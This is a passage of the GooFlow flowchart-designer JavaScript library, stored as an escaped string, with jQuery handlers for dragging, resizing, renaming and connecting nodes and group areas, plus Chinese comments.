{\r\n\t\t\t\t\tThis.$ghost.css({\r\n\t\t\t\t\t\tdisplay: \"block\",\r\n\t\t\t\t\t\twidth: This.$areaData[id].width * This.$scale + \"px\",\r\n\t\t\t\t\t\theight: This.$areaData[id].height * This.$scale + \"px\",\r\n\t\t\t\t\t\ttop: This.$areaData[id].top * This.$scale + t.top - This.$workArea[0].parentNode.scrollTop + \"px\",\r\n\t\t\t\t\t\tleft: This.$areaData[id].left * This.$scale + t.left - This.$workArea[0].parentNode.scrollLeft + \"px\",\r\n\t\t\t\t\t\tcursor: cursor\r\n\t\t\t\t\t});\r\n\t\t\t\t\tvX = (This.$areaData[id].left * This.$scale + This.$areaData[id].width * This.$scale) - X;\r\n\t\t\t\t\tvY = (This.$areaData[id].top * This.$scale + This.$areaData[id].height * This.$scale) - Y;\r\n\t\t\t\t}\r\n\t\t\t\telse {\r\n\t\t\t\t\tvX = X - This.$areaData[id].left * This.$scale;\r\n\t\t\t\t\tvY = Y - This.$areaData[id].top * This.$scale;\r\n\t\t\t\t}\r\n\t\t\t\tvar isMove=false;\r\n\t\t\t\tThis.$ghost.css(\"cursor\",cursor);\r\n\t\t\t\tdocument.onmousemove=function(e){\r\n\t\t\t\t\tif(!e)e=window.event;\r\n\t\t\t\t\tvar ev=_mouseP(e);\r\n\t\t\t\t\tif(cursor!==\"move\"){\r\n\t\t\t\t\t\tX=ev.x-t.left+This.$workArea[0].parentNode.scrollLeft-This.$areaData[id].left*This.$scale+vX;\r\n\t\t\t\t\t\tY=ev.y-t.top+This.$workArea[0].parentNode.scrollTop-This.$areaData[id].top*This.$scale+vY;\r\n\t\t\t\t\t\tif(X<200*This.$scale)\tX=200*This.$scale;\r\n\t\t\t\t\t\tif(Y<100*This.$scale)\tY=100*This.$scale;\r\n\t\t\t\t\t\tswitch(cursor){\r\n\t\t\t\t\t\t\tcase \"nw-resize\":This.$ghost.css({width:X+\"px\",height:Y+\"px\"});break;\r\n\t\t\t\t\t\t\tcase \"w-resize\":This.$ghost.css({width:X+\"px\"});break;\r\n\t\t\t\t\t\t\tcase \"n-resize\":This.$ghost.css({height:Y+\"px\"});break;\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse{\r\n\t\t\t\t\t\tif(This.$ghost.css(\"display\")===\"none\"){\r\n\t\t\t\t\t\t\tThis.$ghost.css({display:\"block\",\r\n\t\t\t\t\t\t\t\twidth:This.$areaData[id].width*This.$scale+\"px\", height:This.$areaData[id].height*This.$scale+\"px\",\r\n\t\t\t\t\t\t\t\ttop:This.$areaData[id].top*This.$scale+t.top-This.$workArea[0].parentNode.scrollTop+\"px\",\r\n\t\t\t\t\t\t\t\tleft:This.$areaData[id].left*This.$scale+t.left-This.$workArea[0].parentNode.scrollLeft+\"px\",cursor:cursor});\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\tX=ev.x-vX;Y=ev.y-vY;\r\n\t\t\t\t\t\tif(X<t.left-This.$workArea[0].parentNode.scrollLeft)\r\n\t\t\t\t\t\t\tX=t.left-This.$workArea[0].parentNode.scrollLeft;\r\n\t\t\t\t\t\telse if(X+This.$workArea[0].parentNode.scrollLeft+This.$areaData[id].width*This.$scale>t.left+This.$workArea.width())\r\n\t\t\t\t\t\t\tX=t.left+This.$workArea.width()-This.$workArea[0].parentNode.scrollLeft-This.$areaData[id].width*This.$scale;\r\n\t\t\t\t\t\tif(Y<t.top-This.$workArea[0].parentNode.scrollTop)\r\n\t\t\t\t\t\t\tY=t.top-This.$workArea[0].parentNode.scrollTop;\r\n\t\t\t\t\t\telse if(Y+This.$workArea[0].parentNode.scrollTop+This.$areaData[id].height*This.$scale>t.top+This.$workArea.height())\r\n\t\t\t\t\t\t\tY=t.top+This.$workArea.height()-This.$workArea[0].parentNode.scrollTop-This.$areaData[id].height*This.$scale;\r\n\t\t\t\t\t\tThis.$ghost.css({left:X+\"px\",top:Y+\"px\"});\r\n\t\t\t\t\t}\r\n\t\t\t\t\tisMove=true;\r\n\t\t\t\t};\r\n\t\t\t\tdocument.onmouseup=function(){\r\n\t\t\t\t\tThis.$ghost.empty().hide();\r\n\t\t\t\t\tdocument.onmousemove=null;\r\n\t\t\t\t\tdocument.onmouseup=null;\r\n\t\t\t\t\tif(!isMove)return;\r\n\t\t\t\t\tif(cursor!==\"move\")\r\n\t\t\t\t\t\tThis.resizeArea(id,This.$ghost.outerWidth()/This.$scale,This.$ghost.outerHeight()/This.$scale);\r\n\t\t\t\t\telse\r\n\t\t\t\t\t\tThis.moveArea(id,(X+This.$workArea[0].parentNode.scrollLeft-t.left)/This.$scale, (Y+This.$workArea[0].parentNode.scrollTop-t.top)/This.$scale);\r\n\t\t\t\t\treturn false;\r\n\t\t\t\t}\r\n\t\t\t});\r\n\t\t\t//绑定修改文字说明功能\r\n\t\t\tthis.$group.on(\"dblclick\",{inthis:this},function(e){\r\n\t\t\t\tvar This=e.data.inthis;\r\n\t\t\t\tif(This.$nowType!==\"group\")\treturn;\r\n\t\t\t\tif(!e)e=window.event;\r\n\t\t\t\tif(e.target.tagName!==\"LABEL\")\treturn false;\r\n\t\t\t\tvar p=e.target.parentNode;\r\n\t\t\t\tif(typeof This.onItemDbClick==='function' && This.onItemDbClick(p.id,\"area\")===false)\treturn;\r\n\r\n\t\t\t\tvar oldTxt=e.target.innerHTML;\r\n\t\t\t\tvar x=parseInt(p.style.left,10)+18,y=parseInt(p.style.top,10)+1;\r\n\t\t\t\tvar t=This.t;//t=_elCsys(This.$workArea[0]);\r\n\t\t\t\tThis.$textArea.val(oldTxt).css({display:\"block\",width:130,height:26,\r\n\t\t\t\t\tleft:t.left+x-This.$workArea[0].parentNode.scrollLeft,\r\n\t\t\t\t\ttop:t.top+y-This.$workArea[0].parentNode.scrollTop}).data(\"id\",p.id).focus();\r\n\t\t\t\tThis.$workArea.parent().one(\"mouseup\",function(e){\r\n\t\t\t\t\tif(e.button===2)return false;\r\n\t\t\t\t\tif(This.$textArea.css(\"display\")===\"block\"){\r\n\t\t\t\t\t\tThis.setName(This.$textArea.data(\"id\"),This.$textArea.val(),\"area\");\r\n\t\t\t\t\t\tThis.$textArea.val(\"\").removeData(\"id\").hide();\r\n\t\t\t\t\t}\r\n\t\t\t\t\treturn false;\r\n\t\t\t\t});\r\n\t\t\t\treturn false;\r\n\t\t\t});\r\n\t\t\t//绑定点击事件\r\n\t\t\tthis.$group.mouseup({inthis:this},function(e){\r\n\t\t\t\tvar This=e.data.inthis;\r\n\t\t\t\tif(This.$textArea.css(\"display\")===\"block\"){\r\n\t\t\t\t\tThis.setName(This.$textArea.data(\"id\"),This.$textArea.val(),\"area\");\r\n\t\t\t\t\tThis.$textArea.val(\"\").removeData(\"id\").hide();\r\n\t\t\t\t\treturn false;\r\n\t\t\t\t}\r\n\r\n\t\t\t\tif(This.$nowType!==\"group\")\treturn;\r\n\t\t\t\tif(!e)e=window.event;\r\n\t\t\t\tswitch($(e.target).attr(\"class\")){\r\n\t\t\t\t\tcase \"rs_close\":\tThis.delArea(e.target.parentNode.parentNode.id);return false;//删除该分组区域\r\n\t\t\t\t\tcase \"bg\":\treturn;\r\n\t\t\t\t}\r\n\t\t\t\tswitch(e.target.tagName){\r\n\t\t\t\t\tcase \"LABEL\":\treturn false;\r\n\t\t\t\t\tcase \"I\"://绑定变色功能\r\n\t\t\t\t\t\tvar id=e.target.parentNode.id;\r\n\t\t\t\t\t\tswitch(This.$areaData[id].color){\r\n\t\t\t\t\t\t\tcase \"red\":\tThis.setAreaColor(id,\"yellow\");break;\r\n\t\t\t\t\t\t\tcase \"yellow\":\tThis.setAreaColor(id,\"blue\");break;\r\n\t\t\t\t\t\t\tcase \"blue\":\tThis.setAreaColor(id,\"green\");break;\r\n\t\t\t\t\t\t\tcase \"green\":\tThis.setAreaColor(id,\"red\");break;\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\treturn false;\r\n\t\t\t\t}\r\n\t\t\t\tif(e.data.inthis.$ghost.css(\"display\")===\"none\"){\r\n\t\t\t\t\tvar X,Y;\r\n\t\t\t\t\tvar ev=_mouseP(e),t=_elCsys(this);\r\n\t\t\t\t\tX=ev.x-t.left+this.parentNode.parentNode.scrollLeft;\r\n\t\t\t\t\tY=ev.y-t.top+this.parentNode.parentNode.scrollTop;\r\n\t\t\t\t\tvar color=[\"red\",\"yellow\",\"blue\",\"green\"];\r\n\t\t\t\t\te.data.inthis.addArea(new Date().getTime(),\r\n\t\t\t\t\t\t{name:\"area_\"+e.data.inthis.$max,left:X/This.$scale,top:Y/This.$scale,color:color[e.data.inthis.$max%4],width:200,height:100}\r\n\t\t\t\t\t);\r\n\t\t\t\t\te.data.inthis.$max++;\r\n\t\t\t\t\treturn false;\r\n\t\t\t\t}\r\n\t\t\t});\r\n\t\t},\r\n\t\t//初始化节点绘制层\r\n\t\t_initWorkForNode:function(){\r\n\t\t\t//绑定点击事件\r\n\t\t\tthis.$workArea.on(\"click\",\".GooFlow_item\",{inthis:this},function(e){\r\n\t\t\t\te.data.inthis.focusItem(this.id,true);\r\n\t\t\t\t$(this).removeClass(\"item_mark\");\r\n\t\t\t});\r\n\t\t\t//绑定右键事件\r\n\t\t\tthis.$workArea.on(\"contextmenu\",\".GooFlow_item\",{inthis:this},function(e){\r\n\t\t\t\tvar This=e.data.inthis;\r\n\t\t\t\tif(typeof This.onItemRightClick==='function' && This.onItemRightClick(this.id,\"node\")===false){\r\n\t\t\t\t\twindow.event? window.event.returnValue=false : e.preventDefault();\r\n\t\t\t\t\treturn false;\r\n\t\t\t\t}\r\n\t\t\t});\r\n\r\n\t\t\t//绑定双击功能\r\n\t\t\tvar tmpDbClickFunc=function(This){\r\n\t\t\t\tThis.$workArea.parent().one(\"mousedown\",function(e){\r\n\t\t\t\t\tif(e.button===2)return false;\r\n\t\t\t\t\tThis.setName(This.$textArea.data(\"id\"),This.$textArea.val(),\"node\");\r\n\t\t\t\t\tThis.$textArea.val(\"\").removeData(\"id\").hide();\r\n\t\t\t\t});\r\n\t\t\t};\r\n\t\t\tthis.$workArea.on(\"dblclick\",\".ico\",{inthis:this},function(e){\r\n\t\t\t\tvar id=$(this).parents(\".GooFlow_item\").attr(\"id\");\r\n\t\t\t\tvar This=e.data.inthis;\r\n\t\t\t\tif(typeof This.onItemDbClick==='function' && This.onItemDbClick(id,\"node\")===false)\treturn false;\r\n\t\t\t});\r\n\t\t\t//绑定双击(包括双击编辑)事件\r\n\t\t\tthis.$workArea.on(\"dblclick\",\".GooFlow_item > .span\",{inthis:this},function(e){\r\n\t\t\t\tvar id=this.parentNode.id;\r\n\t\t\t\tvar This=e.data.inthis;\r\n\t\t\t\tif(typeof This.onItemDbClick==='function' && This.onItemDbClick(id,\"node\")===false)\treturn false;\r\n\t\t\t\tif(!This.$editable)\treturn;\r\n\t\t\t\tvar oldTxt=this.innerHTML;\r\n\t\t\t\tvar t=This.t;//t=_elCsys(This.$workArea[0]);\r\n\t\t\t\tThis.$textArea.val(oldTxt).css({display:\"block\",height:$(this).height()+6,width:100,\r\n\t\t\t\t\tleft:t.left+This.$nodeData[id].left*This.$scale-This.$workArea[0].parentNode.scrollLeft-26,\r\n\t\t\t\t\ttop:t.top+This.$nodeData[id].top*This.$scale-This.$workArea[0].parentNode.scrollTop+26})\r\n\t\t\t\t.data(\"id\",This.$focus).focus();\r\n\t\t\t\ttmpDbClickFunc(This);\r\n\t\t\t});\r\n\t\t\tthis.$workArea.on(\"dblclick\",\".ico + td\",{inthis:this},function(e){\r\n\t\t\t\tvar id=$(this).parents(\".GooFlow_item\").attr(\"id\");\r\n\t\t\t\tvar This=e.data.inthis;\r\n\t\t\t\tif(typeof This.onItemDbClick==='function' && This.onItemDbClick(id,\"node\")===false)\treturn false;\r\n\t\t\t\tif(!This.$editable)\treturn;\r\n\t\t\t\tvar oldTxt=this.childNodes[0].innerHTML;\r\n\t\t\t\tvar t=This.t;//t=_elCsys(This.$workArea[0]);\r\n\t\t\t\tThis.$textArea.val(oldTxt).css({display:\"block\",width:$(this).width()+26,height:$(this).height()+6,\r\n\t\t\t\t\tleft:t.left+26+This.$nodeData[id].left*This.$scale-This.$workArea[0].parentNode.scrollLeft,\r\n\t\t\t\t\ttop:t.top+2+This.$nodeData[id].top*This.$scale-This.$workArea[0].parentNode.scrollTop})\r\n\t\t\t\t.data(\"id\",This.$focus).focus();\r\n\t\t\t\ttmpDbClickFunc(This);\r\n\t\t\t});\r\n\t\t\tif(!this.$editable)\treturn;\r\n\r\n\t\t\t//以下是工作区为编辑模式时才绑定的事件\r\n\t\t\t//绑定用鼠标移动事件\r\n\t\t\tthis.$workArea.on(\"mousedown\",\".ico\",{inthis:this},function(e){\r\n\t\t\t\tif(!e)e=window.event;\r\n\t\t\t\tif(e.button===2)return false;\r\n\t\t\t\tvar This=e.data.inthis;\r\n\t\t\t\tif(This.$nowType===\"direct\"||This.$nowType===\"dashed\")\treturn;\r\n\t\t\t\tvar Dom=$(this).parents(\".GooFlow_item\");\r\n\t\t\t\tvar id=Dom.attr(\"id\");\r\n\t\t\t\tThis.focusItem(id,true);\r\n\r\n\t\t\t\tvar ev=_mouseP(e),t=This.t;//t=_elCsys(This.$workArea[0]);\r\n\r\n\t\t\t\tDom.children(\"table\").clone().prependTo(This.$ghost);\r\n\t\t\t\tvar X,Y;\r\n\t\t\t\tX=ev.x-t.left+This.$workArea[0].parentNode.scrollLeft;\r\n\t\t\t\tY=ev.y-t.top+This.$workArea[0].parentNode.scrollTop;\r\n\t\t\t\tvar vX=X-This.$nodeData[id].left*This.$scale,vY=Y-This.$nodeData[id].top*This.$scale;\r\n\t\t\t\tvar isMove=false;\r\n\t\t\t\tdocument.onmousemove=function(e){\r\n\t\t\t\t\tif(!e)e=window.event;\r\n\t\t\t\t\tvar ev=_mouseP(e);\r\n\t\t\t\t\tif(X===ev.x-vX&&Y===ev.y-vY)\treturn false;\r\n\t\t\t\t\tX=ev.x-vX;Y=ev.y-vY;\r\n\r\n\t\t\t\t\tif(isMove&&This.$ghost.css(\"display\")===\"none\"){\r\n\t\t\t\t\t\tThis.$ghost.css({display:\"block\",\r\n\t\t\t\t\t\t\twidth:This.$nodeData[id].width*This.$scale+\"px\", height:This.$nodeData[id].height*This.$scale+\"px\",\r\n\t\t\t\t\t\t\ttop:This.$nodeData[id].top*This.$scale+t.top-This.$workArea[0].parentNode.scrollTop+\"px\",\r\n\t\t\t\t\t\t\tleft:This.$nodeData[id].left*This.$scale+t.left-This.$workArea[0].parentNode.scrollLeft+\"px\",\r\n\t\t\t\t\t\t\tcursor:\"move\"\r\n\t\t\t\t\t\t});\r\n\t\t\t\t\t}\r\n\r\n\t\t\t\t\tif(X<t.left-This.$workArea[0].parentNode.scrollLeft)\r\n\t\t\t\t\t\tX=t.left-This.$workArea[0].parentNode.scrollLeft;\r\n\t\t\t\t\telse if(X+This.$workArea[0].parentNode.scrollLeft+This.$nodeData[id].width*This.$scale>t.left+This.$workArea.width())\r\n\t\t\t\t\t\tX=t.left+This.$workArea.width()-This.$workArea[0].parentNode.scrollLeft-This.$nodeData[id].width*This.$scale;\r\n\t\t\t\t\tif(Y<t.top-This.$workArea[0].parentNode.scrollTop)\r\n\t\t\t\t\t\tY=t.top-This.$workArea[0].parentNode.scrollTop;\r\n\t\t\t\t\telse if(Y+This.$workArea[0].parentNode.scrollTop+This.$nodeData[id].height*This.$scale>t.top+This.$workArea.height())\r\n\t\t\t\t\t\tY=t.top+This.$workArea.height()-This.$workArea[0].parentNode.scrollTop-This.$nodeData[id].height*This.$scale;\r\n\t\t\t\t\tThis.$ghost.css({left:X+\"px\",top:Y+\"px\"});\r\n\t\t\t\t\tisMove=true;\r\n\t\t\t\t};\r\n\t\t\t\tdocument.onmouseup=function(){\r\n\t\t\t\t\tif(isMove)This.moveNode(id,(X+This.$workArea[0].parentNode.scrollLeft-t.left)/This.$scale,(Y+This.$workArea[0].parentNode.scrollTop-t.top)/This.$scale);\r\n\t\t\t\t\tThis.$ghost.empty().hide();\r\n\t\t\t\t\tdocument.onmousemove=null;\r\n\t\t\t\t\tdocument.onmouseup=null;\r\n\t\t\t\t}\r\n\t\t\t});\r\n\t\t\t//绑定鼠标覆盖/移出事件\r\n\t\t\tthis.$workArea.on(\"mouseenter\",\".GooFlow_item\",{inthis:this},function(e){\r\n\t\t\t\tif((e.data.inthis.$nowType!==\"direct\"&&e.data.inthis.$nowType!==\"dashed\")&&!document.getElementById(\"GooFlow_tmp_line\"))\treturn;\r\n\t\t\t\t$(this).addClass(\"item_mark\").addClass(\"crosshair\").css(\"border-color\",GooFlow.color.mark);\r\n\t\t\t});\r\n\t\t\tthis.$workArea.on(\"mouseleave\",\".GooFlow_item\",{inthis:this},function(e){\r\n\t\t\t\tif((e.data.inthis.$nowType!==\"direct\"&&e.data.inthis.$nowType!==\"dashed\")&&!document.getElementById(\"GooFlow_tmp_line\"))\treturn;\r\n\t\t\t\t$(this).removeClass(\"item_mark\").removeClass(\"crosshair\");\r\n\t\t\t\tif(this.id===e.data.inthis.$focus){\r\n\t\t\t\t\t$(this).css(\"border-color\",GooFlow.color.line);\r\n\t\t\t\t}else{\r\n\t\t\t\t\t$(this).css(\"border-color\",GooFlow.color.node);\r\n\t\t\t\t}\r\n\t\t\t});\r\n\t\t\t//绑定连线时确定初始点\r\n\t\t\tthis.$workArea.on(\"mousedown\",\".GooFlow_item\",{inthis:this},function(e){\r\n\t\t\t\tif(e.button===2)return false;\r\n\t\t\t\tvar This=e.data.inthis;\r\n\t\t\t\tif(This.$nowType!==\"direct\"&&This.$nowType!==\"dashed\")\treturn;\r\n\t\t\t\tvar ev=_mouseP(e),t=_elCsys(This.$workArea[0]);\r\n\t\t\t\tvar X,Y;\r\n\t\t\t\tX=ev.x-t.left+This.$workArea[0].parentNode.scrollLeft;\r\n\t\t\t\tY=ev.y-t.top+This.$workArea[0].parentNode.scrollTop;\r\n\t\t\t\tThis.$workArea.data(\"lineStart\",{\"x\":X,\"y\":Y,\"id\":this.id}).css(\"cursor\",\"crosshair\");\r\n\t\t\t\tvar line=GooFlow.prototype.drawLine(\"GooFlow_tmp_line\",[X,Y],[X,Y],true,true,1);\r\n\t\t\t\tThis.$draw.appendChild(line);\r\n\t\t\t});\r\n\t\t\t//绑定连线时确定结束点\r\n\t\t\tthis.$workArea.on(\"mouseup\",\".GooFlow_item\",{inthis:this},function(e){\r\n\t\t\t\tvar This=e.data.inthis;\r\n\t\t\t\tif((This.$nowType!==\"direct\"&&This.$nowType!==\"dashed\")&&!This.$mpTo.data(\"p\"))\treturn;\r\n\t\t\t\tvar lineStart=This.$workArea.data(\"lineStart\");\r\n\t\t\t\tvar lineEnd=This.$workArea.data(\"lineEnd\");\r\n\t\t\t\tif(lineStart&&!This.$mpTo.data(\"p\")){\r\n\t\t\t\t\tvar tmp={from:lineStart.id,to:this.id,name:\"\"};\r\n\t\t\t\t\tif(This.$nowType===\"dashed\"){\r\n\t\t\t\t\t\ttmp.dash=true;\r\n\t\t\t\t\t}\r\n\t\t\t\t\tThis.addLine(new Date().getTime(),tmp);\r\n\t\t\t\t\tThis.$max++;\r\n\t\t\t\t}\r\n\t\t\t\telse{\r\n\t\t\t\t\tif(lineStart){\r\n\t\t\t\t\t\tThis.moveLinePoints(This.$focus,lineStart.id,this.id);\r\n\t\t\t\t\t}else if(lineEnd){\r\n\t\t\t\t\t\tThis.moveLinePoints(This.$focus,this.id,lineEnd.id);\r\n\t\t\t\t\t}\r\n\t\t\t\t\tif(!This.$nodeData[this.id].marked){\r\n\t\t\t\t\t\t$(this).removeClass(\"item_mark\");\r\n\t\t\t\t\t\tif(this.id!==This.$focus){\r\n\t\t\t\t\t\t\t$(this).css(\"border-color\",GooFlow.color.node);\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\telse{\r\n\t\t\t\t\t\t\t$(this).css(\"border-color\",GooFlow.color.line);\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t});\r\n\r\n\t\t\t//绑定结点的删除功能\r\n\t\t\tthis.$workArea.on(\"click\",\".rs_close\",{inthis:this},function(e){\r\n\t\t\t\tif(!e)e=window.event;\r\n\t\t\t\te.data.inthis.delNode(e.data.inthis.$focus);\r\n\t\t\t\treturn false;\r\n\t\t\t});\r\n\t\t\t//绑定结点的RESIZE功能\r\n\t\t\tthis.$workArea.on(\"mousedown\",\".GooFlow_item > div > div[class!=rs_close]\",{inthis:this},function(e){\r\n\t\t\t\tif(!e)e=window.event;\r\n\t\t\t\tif(e.button===2)return false;\r\n\t\t\t\tvar cursor=$(this).css(\"cursor\");\r\n\t\t\t\tif(cursor===\"pointer\"){return;}\r\n\t\t\t\tvar This=e.data.inthis;\r\n\t\t\t\tvar id=This.$focus;\r\n\t\t\t\tThis.switchToolBtn(\"cursor\");\r\n\t\t\t\te.cancelBubble = true;\r\n\t\t\t\te.stopPropagation();\r\n\r\n\t\t\t\tvar ev=_mouseP(e),t=This.t;//t=_elCsys(This.$workArea[0]);\r\n\t\t\t\tThis.$ghost.css({display:\"block\",\r\n\t\t\t\t\twidth:This.$nodeData[id].width*This.$scale+\"px\", height:This.$nodeData[id].height*This.$scale+\"px\",\r\n\t\t\t\t\ttop:This.$nodeData[id].top*This.$scale+t.top-This.$workArea[0].parentNode.scrollTop+\"px\",\r\n\t\t\t\t\tleft:This.$nodeData[id].left*This.$scale+t.left-This.$workArea[0].parentNode.scrollLeft+\"px\",\r\n\t\t\t\t\tcursor:cursor\r\n\t\t\t\t});\r\n\t\t\t\tvar X,Y;\r\n\t\t\t\tX=ev.x-t.left+This.$workArea[0].parentNode.scrollLeft;\r\n\t\t\t\tY=ev.y-t.top+This.$workArea[0].parentNode.scrollTop;\r\n\t\t\t\tvar vX=(This.$nodeData[id].left*This.$scale+This.$nodeData[id].width*This.$scale)-X;\r\n\t\t\t\tvar vY=(This.$nodeData[id].top*This.$scale+This.$nodeData[id].height*This.$scale)-Y;\r\n\t\t\t\tvar isMove=false;\r\n\t\t\t\tThis.$ghost.css(\"cursor\",cursor);\r\n\t\t\t\tdocument.onmousemove=function(e){\r\n\t\t\t\t\tif(!e)e=window.event;\r\n\t\t\t\t\tvar ev=_mouseP(e);\r\n\t\t\t\t\tX=ev.x-t.left+This.$workArea[0].parentNode.scrollLeft-This.$nodeData[id].left*This.$scale+vX;\r\n\t\t\t\t\tY=ev.y-t.top+This.$workArea[0].parentNode.scrollTop-This.$nodeData[id].top*This.$scale+vY;\r\n\t\t\t\t\tif(X<104*This.$scale)\tX=104*This.$scale;\r\n\t\t\t\t\tif(Y<26*This.$scale)\tY=26*This.$scale;\r\n\t\t\t\t\tisMove=true;\r\n\t\t\t\t\tswitch(cursor){\r\n\t\t\t\t\t\tcase \"nw-resize\":This.$ghost.css({width:X+\"px\",height:Y+\"px\"});break;\r\n\t\t\t\t\t\tcase \"w-resize\":This.$ghost.css({width:X+\"px\"});break;\r\n\t\t\t\t\t\tcase \"n-resize\":This.$ghost.css({height:Y+\"px\"});break;\r\n\t\t\t\t\t}\r\n\t\t\t\t};\r\n\t\t\t\tdocument.onmouseup=function(){\r\n\t\t\t\t\tdocument.onmousemove=null;\r\n\t\t\t\t\tdocument.onmouseup=null;\r\n\t\t\t\t\tThis.$ghost.hide();\r\n\t\t\t\t\tif(!isMove)return;\r\n\t\t\t\t\t//if(!e)e=window.event;\r\n\t\t\t\t\tThis.resizeNode(id,This.$ghost.outerWidth()/This.$scale,This.$ghost.outerHeight()/This.$scale);\r\n\t\t\t\t};\r\n\t\t\t});\r\n\t\t},\r\n\t\t//加入手动扩展编辑区功能，一次扩展200px\r\n\t\t_initExpendFunc:function(){\r\n\t\t\tvar titleExendRight=GooFlow.remarks.extendRight? ' title=\"'+GooFlow.remarks.extendRight+'\"':'';\r\n\t\t\tvar titleExendBottom=GooFlow.remarks.extendBottom? ' title=\"'+GooFlow.remarks.extendBottom+'\"':'';\r\n\t\t\tthis.$workArea.append('<div class=\"Gooflow_extend_right\"'+titleExendRight+'></div><div class=\"Gooflow_extend_bottom\"'+titleExendBottom+'></div>');\r\n\t\t\tthis.$workArea.children(\".Gooflow_extend_right\").on(\"click\",{inthis:this},function(e){\r\n\t\t\t\tvar This=e.data.inthis;\r\n\t\t\t\tvar w = This.$workArea.width()+This.$workExtendStep;\r\n\t\t\t\tvar h = This.$workArea.height();\r\n\t\t\t\tThis.$workArea.css({width:w+\"px\"});\r\n\t\t\t\tif(GooFlow.prototype.useSVG===\"\"){\r\n\t\t\t\t\tThis.$draw.coordsize = w+\",\"+h;\r\n\t\t\t\t}\r\n\t\t\t\tThis.$draw.style.width = w + \"px\";\r\n\t\t\t\tif(This.$group!=null){\r\n\t\t\t\t\tThis.$group.css({width:w+\"px\"});\r\n\t\t\t\t}\r\n\t\t\t\tvar parentDiv = This.$workArea.parent()[0];\r\n\t\t\t\tparentDiv.scrollLeft = parentDiv.scrollWidth;\r\n\t\t\t\tThis.$workArea.parent().css(\"overflow\",\"scroll\");\r\n\t\t\t\treturn false;\r\n\t\t\t});\r\n\t\t\tthis.$workArea.children(\".Gooflow_extend_bottom\").on(\"click\",{inthis:this},function(e){\r\n\t\t\t\tvar This=e.data.inthis;\r\n\t\t\t\tvar w = This.$workArea.width();\r\n\t\t\t\tvar h = This.$workArea.height()+This.$workExtendStep;\r\n\t\t\t\tThis.$workArea.css({height:h+\"px\"});\r\n\t\t\t\tif(GooFlow.prototype.useSVG===\"\"){\r\n\t\t\t\t\tThis.$draw.coordsize = w+\",\"+h;\r\n\t\t\t\t}\r\n\t\t\t\tThis.$draw.style.height = h + \"px\";\r\n\t\t\t\tif(This.$group!=null){\r\n\t\t\t\t\tThis.$group.css({height:h+\"px\"});\r\n\t\t\t\t}\r\n\t\t\t\tvar parentDiv = This.$workArea.parent()[0];\r\n\t\t\t\tparentDiv.scrollTop = parentDiv.scrollHeight;\r\n\t\t\t\tThis.$workArea.parent().css(\"overflow\",\"scroll\");\r\n\t\t\t\treturn false;\r\n\t\t\t});\r\n\t\t},\r\n\t\t//初始化用来改变连线的连接端点的两个小方块的操作事件\r\n\t\t_initLinePointsChg:function(){\r\n\t\t\tthis.$mpFrom.on(\"mousedown\",{inthis:this},function(e){\r\n\t\t\t\tvar This=e.data.inthis;\r\n\t\t\t\tThis.switchToolBtn(\"cursor\");\r\n\t\t\t\tvar ps=This.$mpFrom.data(\"p\").split(\",\");\r\n\t\t\t\tvar pe=This.$mpTo.data(\"p\").split(\",\");\r\n\t\t\t\t$(this).hide();\r\n\t\t\t\tThis.$workArea.data(\"lineEnd\",{\"x\":pe[0],\"y\":pe[1],\"id\":This.$lineData[This.$lineOper.data(\"tid\")].to}).css(\"cursor\",\"crosshair\");\r\n\t\t\t\tvar line=GooFlow.prototype.drawLine(\"GooFlow_tmp_line\",[ps[0],ps[1]],[pe[0],pe[1]],true,true,1);\r\n\t\t\t\tThis.$draw.appendChild(line);\r\n\t\t\t\treturn false;\r\n\t\t\t});\r\n\t\t\tthis.$mpTo.on(\"mousedown\",{inthis:this},function(e){\r\n\t\t\t\tvar This=e.data.inthis;\r\n\t\t\t\tThis.switchToolBtn(\"cursor\");\r\n\t\t\t\tvar ps=This.$mpFrom.data(\"p\").split(\",\");\r\n\t\t\t\tvar pe=This.$mpTo.data(\"p\").split(\",\");\r\n\t\t\t\t$(this).hide();\r\n\t\t\t\tThis.$workArea.data(\"lineStart\",{\"x\":ps[0],\"y\":ps[1],\"id\":This.$lineData[This.$lineOper.data(\"tid\")].from}).css(\"cursor\",\"crosshair\");\r\n\t\t\t\tvar line=GooFlow.prototype.drawLine(\"GooFlow_tmp_line\",[ps[0],ps[1]],[pe[0],pe[1]],true,true,1);\r\n\t\t\t\tThis.$draw.appendChild(line);\r\n\t\t\t\treturn false;\r\n\t\t\t});\r\n\t\t},\r\n\t\t//初始化设计器的编辑功能\r\n\t\t_initEditFunc:function(useOperStack){\r\n\t\t\t//划线或改线时用的绑定\r\n\t\t\tthis.$workArea.mousemove({inthis:this},function(e){\r\n\t\t\t\tvar This=e.data.inthis;\r\n\t\t\t\tif((This.$nowType!==\"direct\"&&This.$nowType!==\"dashed\")&&!This.$mpTo.data(\"p\"))\treturn;\r\n\t\t\t\tvar lineStart=$(this).data(\"lineStart\");\r\n\t\t\t\tvar lineEnd=$(this).data(\"lineEnd\");\r\n\t\t\t\tif(!lineStart&&!lineEnd)return;\r\n\r\n\t\t\t\tvar ev=_mouseP(e),t=_elCsys(this);\r\n\t\t\t\tvar X,Y;\r\n\t\t\t\tX=ev.x-t.left+this.parentNode.scrollLeft;\r\n\t\t\t\tY=ev.y-t.top+this.parentNode.scrollTop;\r\n\t\t\t\tvar line=document.getElementById(\"GooFlow_tmp_line\");\r\n\t\t\t\tif(lineStart){\r\n\t\t\t\t\tif(GooFlow.prototype.useSVG!==\"\"){\r\n\t\t\t\t\t\tline.childNodes[0].setAttribute(\"d\",\"M \"+lineStart.x+\" \"+lineStart.y+\" L \"+X+\" \"+Y);\r\n\t\t\t\t\t\tline.childNodes[1].setAttribute(\"d\",\"M \"+lineStart.x+\" \"+lineStart.y+\" L \"+X+\" \"+Y);\r\n\t\t\t\t\t\tif(line.childNodes[1].getAttribute(\"marker-end\")==='url(\"#arrow2\")')\r\n\t\t\t\t\t\t\tline.childNodes[1].setAttribute(\"marker-end\",\"url(#arrow3)\");\r\n\t\t\t\t\t\telse\tline.childNodes[1].setAttribute(\"marker-end\",\"url(#arrow2)\");\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse\tline.points.value=lineStart.x+\",\"+lineStart.y+\" \"+X+\",\"+Y;\r\n\t\t\t\t}else 